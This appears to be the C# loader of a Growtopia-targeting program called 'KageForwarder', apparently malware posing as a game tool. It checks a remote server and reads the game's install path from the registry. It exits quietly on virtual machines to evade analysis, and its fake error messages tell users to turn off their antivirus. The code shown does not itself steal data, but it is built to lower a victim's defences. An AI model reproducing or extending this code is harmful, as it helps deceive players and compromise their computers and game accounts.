using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KageForwarder
{
    internal class Programs
    {
        public static void xd()
        {
            try
            {
               
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new Login());
            }
            catch
            {
                MessageBox.Show("Error while initializing please turn off your antivirus.","Error!",MessageBoxButtons.OK,MessageBoxIcon.Error);
            }

          
        }
    }
    internal static class Program
    {
		
		public static void AntiVM()
		{
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation") && (item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                                || manufacturer.Contains("vmware")
                                || item["Model"].ToString() == "VirtualBox")
                        {
                            Environment.Exit(0);
                        }
                        else
                        {
                            Programs.xd();
                        }
                    }
                }
            }
                   
		}

        [STAThread]
        public static void Main(string[] args)
        {
            WebClient web = new WebClient();
            string a = web.DownloadString("http://kageforwarder2.ml/version.txt");
            string b = web.DownloadString("http://kageforwarder2.ml/trash/dc.php");
            
            if (a == "down")
            {
                MessageBox.Show("Server is down or software is updating join discord for more information.", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Process.Start(b);
            }
            if (a == "up")
            {
                RegistryKey gtreg;
                gtreg = Registry.CurrentUser.OpenSubKey(@"Software\Growtopia", true);
                string pathvalue = (string)gtreg.GetValue("path");
                if (Directory.Exists(pathvalue))
                {
                    AntiVM();
                }
                else
                {
                    MessageBox.Show("Error while initializing please turn off your antivirus. (0x15)", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Application.Exit();
                }
            }           
        }
    }
}
